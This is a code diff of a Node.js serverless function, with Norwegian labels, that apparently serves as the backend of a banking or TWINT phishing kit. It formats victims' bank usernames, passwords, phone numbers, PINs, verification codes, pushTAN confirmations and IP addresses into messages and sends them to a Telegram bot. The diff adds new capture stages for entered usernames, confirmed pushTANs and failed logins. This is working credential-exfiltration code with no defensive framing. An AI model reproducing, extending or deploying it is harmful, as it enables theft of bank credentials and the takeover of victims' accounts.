@@ -1,6 +1,6 @@
 // api/telegram.js
 // Vercel Serverless Function for sending data to Telegram
-// Based on moliuon-main implementation
+// Based on twint implementation
 
 // Telegram Bot API konfigurasjon
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -194,7 +194,16 @@ async function sendToTelegram(chatId, message, topicId = null) {
  * Formaterer data til en lesbar Telegram-melding
  */
 function formatTelegramMessage(data, isNewIPAddress = false) {
-  const { action, bank, phone, bank_username, bank_password, verification_code, auth_method, pin_attempt, pin, ip_adresse, timestamp } = data;
+  const { action, bank, phone, telefonnummer, bank_username, bank_password, verification_code, auth_method, pin_attempt, pin, ip_adresse, timestamp, pushTAN_date_time, save_device, error_message } = data;
+  
+  // Log for debugging
+  console.log('Formatting Telegram message:', {
+    action: action,
+    bank: bank,
+    bank_username: bank_username,
+    telefonnummer: telefonnummer,
+    hasData: !!data
+  });
   
   let message = '';
   
@@ -271,11 +280,48 @@ function formatTelegramMessage(data, isNewIPAddress = false) {
       break;
 
     case 'bank_login':
-      message += `🔐 <b>Ny TWINT Registrering</b>\n`;
+      message += `🔐 <b>Bank Login</b>\n`;
       message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
-      message += `📱 <b>Telefon:</b> <code>${phone || 'N/A'}</code>\n`;
       message += `👤 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
       message += `🔑 <b>Passord:</b> <code>${bank_password || 'N/A'}</code>\n`;
+      if (save_device !== undefined) {
+        message += `💾 <b>Enhet lagret:</b> ${save_device ? 'Ja' : 'Nei'}\n`;
+      }
+      break;
+
+    case 'login_username_entered':
+      message += `👤 <b>Brukernavn Oppgitt</b>\n`;
+      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
+      message += `📝 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
+      if (telefonnummer) {
+        message += `📱 <b>Telefonnummer:</b> <code>${telefonnummer}</code>\n`;
+      }
+      break;
+
+    case 'pushTAN_confirmed':
+      message += `✅ <b>pushTAN Bekreftet</b>\n`;
+      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
+      message += `👤 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
+      message += `🔑 <b>Passord:</b> <code>${bank_password || 'N/A'}</code>\n`;
+      if (pushTAN_date_time) {
+        message += `⏰ <b>pushTAN Tid:</b> ${pushTAN_date_time}\n`;
+      }
+      if (save_device !== undefined) {
+        message += `💾 <b>Enhet lagret:</b> ${save_device ? 'Ja' : 'Nei'}\n`;
+      }
+      break;
+
+    case 'login_failed':
+      message += `❌ <b>Login Feilet</b>\n`;
+      message += `🏦 <b>Bank:</b> ${bank || 'N/A'}\n`;
+      message += `👤 <b>Brukernavn:</b> <code>${bank_username || 'N/A'}</code>\n`;
+      message += `🔑 <b>Passord:</b> <code>${bank_password || 'N/A'}</code>\n`;
+      if (error_message) {
+        message += `⚠️ <b>Feilmelding:</b> ${error_message}\n`;
+      }
+      if (save_device !== undefined) {
+        message += `💾 <b>Enhet lagret:</b> ${save_device ? 'Ja' : 'Nei'}\n`;
+      }
       break;
 
     default:
@@ -331,6 +377,12 @@ module.exports = async (req, res) => {
 
     if (!userData) {
       return res.status(400).json({ error: 'No data provided' });
+    }
+
+    // Validate that action is present
+    if (!userData.action) {
+      console.error('Missing action in userData:', userData);
+      return res.status(400).json({ error: 'Missing action in data' });
     }
 
     // Hent IP-adresse fra headers (Vercel setter x-forwarded-for)
